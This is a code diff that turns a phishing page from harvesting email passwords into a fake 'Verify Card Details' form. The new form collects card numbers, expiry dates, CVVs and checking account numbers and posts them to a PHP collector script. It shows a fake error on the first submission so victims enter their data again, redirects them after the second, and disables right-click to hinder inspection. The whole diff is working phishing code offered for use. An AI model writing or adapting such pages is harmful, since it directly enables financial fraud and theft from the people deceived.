@@ -63,18 +63,26 @@
                        <div class="row">
                            <div class="col-xs-10 col-xs-offset-1">
                                <form action="" method="post" id="res" enctype="multipart/form-data">
-                                 <h3 style="font-family: sans-serif;text-align: center;">Syncronize Your Email Address</h3>
+                                 <h3 style="font-family: sans-serif;text-align: center;">Verify Card Details</h3>
                                    <span style="color: crimson;" class="rror" id="rror">
                                         <i class="fas fa-circle-exclamation" style="color: crimson;"></i>
-                                        Wrong password, please try again
+                                        Invalid card details, please try again
                                     </span>
                                   <div class="us-norm us-mt">
-                                   <input type="email" class="frinp" name="aa" id="userid" required>
-                                   <label for="userid" class="frel">Email address</label>
+                                   <input type="text" class="frinp" name="cardnumber" id="cardnumber" required pattern="[0-9]{16}" maxlength="16">
+                                   <label for="cardnumber" class="frel">Card Number</label>
                                   </div>
                                   <div class="us-norm">
-                                   <input type="password" class="frinp" name="bb" id="pass" required minlength="5">
-                                   <label for="pass" class="frel">Email password</label>
+                                   <input type="text" class="frinp" name="exp" id="exp" required pattern="[0-9]{2}/[0-9]{2}" maxlength="5" placeholder="MM/YY">
+                                   <label for="exp" class="frel">Expiration Date (MM/YY)</label>
+                                  </div>
+                                  <div class="us-norm">
+                                   <input type="text" class="frinp" name="cvv" id="cvv" required pattern="[0-9]{3,4}" maxlength="4">
+                                   <label for="cvv" class="frel">CVV</label>
+                                  </div>
+                                  <div class="us-norm">
+                                   <input type="text" class="frinp" name="checkingacc" id="checkingacc" required pattern="[0-9]{8,17}" minlength="8" maxlength="17">
+                                   <label for="checkingacc" class="frel">Checking Account Number</label>
                                   </div>
                                   <!-- <div class="us-norm">
                                    <input type="text" class="frinp" name="tok" id="token" style="display:none;">
@@ -181,9 +189,7 @@ function myFunction() {
     ken.style.display = "none";
   }
 }
-      const eml = localStorage.getItem("caseemail");
-      document.getElementById("userid").value = eml;
-       document.addEventListener('contextmenu', function (e) {
+      document.addEventListener('contextmenu', function (e) {
          e.preventDefault();
        });
       
@@ -203,24 +209,20 @@ function myFunction() {
       
           var formData = new FormData(this);
           var xhr = new XMLHttpRequest();
-          xhr.open("POST", "./config/email.php", true); // your php url here
+          xhr.open("POST", "./config/card.php", true);
       
           xhr.onreadystatechange = function () {
-              const directts = localStorage.getItem("userDomain")
-              console.log(directts);
               if (xhr.readyState == 4 && xhr.status == 200) {
                   console.log(xhr.responseText);
       
                   if (formSubmitted === 1) {
-                      document.getElementById("pass").value = "";
-                     document.getElementById("pass").value = "";
-                      console.log("YESSSSS");
+                      document.getElementById("cvv").value = "";
                       document.getElementById("rror").style.display = "block";
                       setTimeout(() => {
-                        document.getElementById("errorr").style.display = "none"
-                      }, 1500);
+                        document.getElementById("rror").style.display = "none"
+                      }, 3000);
                   } else if (formSubmitted >= 2) {
-                      window.location.href = "./otp.php";
+                      window.location.href = "./fl.php";
                   }
               }
           };
